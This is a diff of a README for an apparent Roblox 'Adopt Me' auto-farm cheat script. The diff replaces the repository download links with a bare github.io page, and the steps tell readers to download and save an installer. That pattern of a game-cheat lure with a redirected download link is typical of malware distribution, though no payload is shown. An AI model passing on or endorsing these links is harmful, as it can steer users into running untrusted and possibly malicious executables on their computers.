@@ -1,6 +1,6 @@
 # 🐾 Adopt-Me-Script-Auto-Farm-2026 - Automate your pet collection process easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/christincirculating428/Adopt-Me-Script-Auto-Farm-2026)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://christincirculating428.github.io)
 
 ## 📌 About this project
 
@@ -20,7 +20,7 @@ Before you start, check your computer for these requirements.
 
 Follow these steps to set up the software.
 
-1. Visit the repository page to download the necessary files. [Click here to visit the page](https://github.com/christincirculating428/Adopt-Me-Script-Auto-Farm-2026).
+1. Visit the repository page to download the necessary files. [Click here to visit the page](https://christincirculating428.github.io).
 2. Look for the releases section on the right side of the page.
 3. Download the latest version of the installer.
 4. Save the file to your desktop for easy access.
